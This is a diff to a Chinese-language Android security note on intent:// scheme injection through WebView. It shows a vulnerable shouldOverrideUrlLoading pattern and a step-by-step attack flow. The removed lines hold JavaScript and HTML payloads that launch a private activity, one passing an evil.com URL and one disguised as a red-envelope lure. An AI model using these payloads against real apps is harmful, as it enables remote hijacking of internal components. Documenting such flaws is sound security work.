@@ -1,4 +1,4 @@
-# Intent URL Scheme 滥用
+# Intent Scheme 注入
 
 WebView 中的页面通过 `intent://` scheme 触发应用内组件跳转，`shouldOverrideUrlLoading` 未拦截非白名单 scheme。**Risk: MEDIUM**
 
@@ -10,16 +10,24 @@ WebView 中的页面通过 `intent://` scheme 触发应用内组件跳转，`sho
 **Android 版本范围：所有版本可利用** — intent:// scheme 处理是应用层逻辑。
 
 
-## 关键特征
+## 攻击流程
 
-- `shouldOverrideUrlLoading` 处理 `intent://` scheme
-- 解析 Intent URI 后直接调用 `startActivity()`
-- 未校验目标组件是否在白名单内
-- **远程攻击桥梁**：此攻击可从远程（网页）触发，是连接远程攻击面和本地提权漏洞的桥梁
+```
+1. jiap code subclass android.webkit.WebView → 定位 WebView Activity
+2. jiap code class-source <WebViewActivity> → 定位 shouldOverrideUrlLoading
+3. 检查是否处理 intent:// scheme
+4. 确认 Intent.parseUri() 后是否直接 startActivity()
+5. 构造 intent://#Intent;component=<pkg>/<non-exported-activity>;end
+6. 在 WebView 页面中注入链接触发恶意 Intent
+```
+
+
+## 关键特征与代码
+
+- `shouldOverrideUrlLoading` 处理 `intent://` scheme 后直接调用 `startActivity()`
+- 未校验目标组件是否在白名单内，任意组件可被跳转
 - 未清除 Intent 中的敏感 Flags（如 `FLAG_GRANT_READ_URI_PERMISSION`）
-
-
-## 代码模式
+- **远程攻击桥梁**：此攻击可从远程（网页）触发，是连接远程攻击面和本地提权漏洞的桥梁
 
 ```java
 // 漏洞：未校验 intent:// scheme 的目标组件
@@ -35,28 +43,6 @@ webView.setWebViewClient(new WebViewClient() {
         return false;
     }
 });
-```
-
-```javascript
-// 攻击代码：通过 intent:// 启动应用内部未导出 Activity
-location.href = "intent:#Intent;component=com.victim/.PrivateActivity;S.url=http://evil.com/;end";
-```
-
-```html
-<!-- 攻击网页代码：诱导用户点击触发 intent scheme -->
-<a href="intent:#Intent;component=com.victim/.PrivateActivity;S.extra_data=malicious;end">点击领取红包</a>
-```
-
-
-## 攻击流程
-
-```
-1. jiap code subclass android.webkit.WebView → 定位 WebView Activity
-2. jiap code class-source <WebViewActivity> → 定位 shouldOverrideUrlLoading
-3. 检查是否处理 intent:// scheme
-4. 确认 Intent.parseUri() 后是否直接 startActivity()
-5. 构造 intent://#Intent;component=<pkg>/<non-exported-activity>;end
-6. 在 WebView 页面中注入链接触发恶意 Intent
 ```
 
 
@@ -121,4 +107,3 @@ if (intent.resolveActivity(getPackageManager()) != null) {
 - [[app-activity-intent-redirect]]
 - [[app-webview]]
 - [[app-webview-url-bypass]]
-
